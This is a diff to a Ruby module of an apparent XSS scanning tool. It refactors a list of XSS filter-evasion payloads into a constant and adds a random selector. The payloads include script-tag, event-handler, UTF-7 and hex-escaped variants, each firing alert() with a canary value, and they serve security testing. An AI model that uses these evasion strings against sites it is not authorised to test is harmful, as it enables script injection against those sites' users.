@@ -1,12 +1,11 @@
+require 'securerandom'
+
 module Cross
   module Attack
     class XSS
 
       CANARY = 666
-
-      def self.each
-
-        evasions = [
+      EVASIONS = [
           "a onmouseover=alert(#{Cross::Attack::XSS::CANARY})",
           "<script>alert(#{Cross::Attack::XSS::CANARY})</script>",
           "<script>alert(#{Cross::Attack::XSS::CANARY});</script>",
@@ -67,11 +66,17 @@ module Cross
           "+ADw-script+AD4-alert(#{Cross::Attack::XSS::CANARY})+ADw-/script+AD4-", # UTF-7
           "},alert(#{Cross::Attack::XSS::CANARY}),function x(){//", # DOM breaker
           "\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3ealert(#{Cross::Attack::XSS::CANARY})\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e" #DOM-based innerHTML injection
-        ]
-        evasions.each do |pattern|
+      ]
+
+      def self.rand
+        Cross::Attack::XSS::EVASIONS[SecureRandom.random_number(Cross::Attack::XSS::EVASIONS.size)]
+      end
+
+
+      def self.each
+        Cross::Attack::XSS::EVASIONS.each do |pattern|
           yield pattern if block_given?
         end
-      
       end
 
     end
